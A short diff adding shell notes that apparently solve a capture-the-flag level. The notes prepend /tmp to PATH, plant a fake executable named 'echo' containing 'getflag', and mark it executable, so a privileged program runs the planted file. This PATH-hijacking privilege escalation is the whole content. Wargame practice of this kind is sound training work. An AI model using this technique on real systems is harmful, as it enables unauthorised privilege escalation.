@@ -1,0 +1,4 @@
+PATH=/tmp:$PATH
+nano /tmp/echo
+getflag
+chmod +x /tmp/echo
